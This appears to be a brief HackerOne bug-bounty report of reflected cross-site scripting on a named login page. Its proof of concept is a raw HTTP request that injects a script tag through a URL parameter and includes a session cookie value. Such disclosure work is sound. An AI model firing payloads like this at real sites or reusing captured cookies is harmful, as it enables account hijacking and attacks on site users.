# HackerOne Report: XSS 1
**Report ID:** 9230
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Request
GET /login/?loc=de"><script>prompt(994787)</script> HTTP/1.1
Referer: https://panel.stopthehacker.com
Cookie: sth_panel=9fj5MyELdr2SAJ3yNP5p%2C3
Host: panel.stopthehacker.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*


## Discussion & Remediation Timeline
